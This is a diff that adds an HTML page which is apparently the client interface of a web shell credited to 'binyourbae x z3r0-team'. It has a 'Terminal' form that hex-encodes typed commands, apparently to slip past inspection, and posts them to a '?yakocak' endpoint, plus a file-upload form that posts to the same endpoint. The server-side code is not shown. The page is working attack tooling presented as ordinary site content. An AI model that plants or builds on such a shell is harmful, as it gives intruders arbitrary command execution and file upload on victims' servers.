@@ -1,0 +1,95 @@
+<style>
+  body {
+    background: #000;
+    color: #0f0;
+    font-family: monospace;
+  }
+  input, button {
+    background: #111;
+    color: #0f0;
+    border: 1px solid #0f0;
+    padding: 5px;
+    margin-bottom: 10px;
+  }
+  button {
+    cursor: pointer;
+  }
+  .flex-container {
+    display: flex;
+    gap: 40px;
+    margin-top: 20px;
+  }
+  .block {
+    flex: 1;
+  }
+  a {
+    color: #0f0;
+    text-decoration: underline;
+  }
+  .credit {
+    margin-top: 40px;
+    font-size: 14px;
+    text-align: center;
+    color: #0f0;
+    border-top: 1px dashed #0f0;
+    padding-top: 10px;
+  }
+</style>
+
+<div class="flex-container">
+  <div class="block">
+    <h2>Terminal</h2>
+    <form id="terminalForm" onsubmit="submitTerminal(event)">
+      <input type="text" id="plaincmd" placeholder="Enter command" style="width:100%" required><br>
+      <button type="submit">Run</button>
+    </form>
+    <div id="terminalOutput"></div>
+  </div>
+
+  <div class="block">
+    <h2>Upload File</h2>
+    <form id="uploadForm" enctype="multipart/form-data" onsubmit="uploadFile(event)">
+      <input type="file" name="f" required><br>
+      <button type="submit">Upload</button>
+    </form>
+    <div id="uploadResult"></div>
+  </div>
+</div>
+
+<div class="credit">
+  - binyourbae x z3r0-team -<br>
+</div>
+
+<script>
+  function str2hex(str) {
+    let hex = '';
+    for (let i = 0; i < str.length; i++) {
+      hex += str.charCodeAt(i).toString(16);
+    }
+    return hex;
+  }
+
+  function submitTerminal(e) {
+    e.preventDefault();
+    const plain = document.getElementById('plaincmd').value;
+    const hex = str2hex(plain);
+    fetch("?yakocak", {
+      method: "POST",
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: "hexcmd=" + encodeURIComponent(hex)
+    })
+    .then(res => res.text())
+    .then(output => document.getElementById('terminalOutput').innerHTML = output);
+  }
+
+  function uploadFile(e) {
+    e.preventDefault();
+    const formData = new FormData(document.getElementById('uploadForm'));
+    fetch("?yakocak", {
+      method: "POST",
+      body: formData
+    })
+    .then(res => res.text())
+    .then(res => document.getElementById('uploadResult').innerHTML = res);
+  }
+</script>
